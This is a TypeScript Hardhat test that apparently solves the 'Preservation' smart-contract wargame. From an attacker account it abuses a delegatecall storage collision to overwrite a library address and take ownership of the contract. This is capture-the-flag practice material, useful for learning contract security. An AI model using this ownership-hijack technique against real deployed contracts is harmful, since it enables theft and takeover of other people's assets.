import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract, utils } from 'ethers';
import { ethers } from 'hardhat';

const { provider } = ethers;

describe('Preservation', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    const LibraryContractFactory = await ethers.getContractFactory(
      'LibraryContract'
    );

    const [library1, library2] = await Promise.all([
      LibraryContractFactory.deploy(),
      LibraryContractFactory.deploy(),
    ]);

    await Promise.all([library1.deployed(), library2.deployed()]);

    const Factory = await ethers.getContractFactory('Preservation');
    contract = await Factory.deploy(library1.address, library2.address);
    await contract.deployed();
  });

  it('attack', async () => {
    const AttackerFactory = await ethers.getContractFactory(
      'PreservationAttacker'
    );
    const attackerContract = await AttackerFactory.deploy();
    await attackerContract.deployed();

    let tx;
    tx = await contract
      .connect(attacker)
      .setFirstTime(attackerContract.address);
    await tx.wait();

    let library1 = await provider.getStorageAt(contract.address, 0);
    library1 = utils.getAddress('0x' + library1.substring(26));
    expect(library1).to.equal(attackerContract.address);

    tx = await contract.connect(attacker).setFirstTime(attacker.address);
    await tx.wait();

    expect(await contract.owner()).to.equal(attacker.address);
  });
});
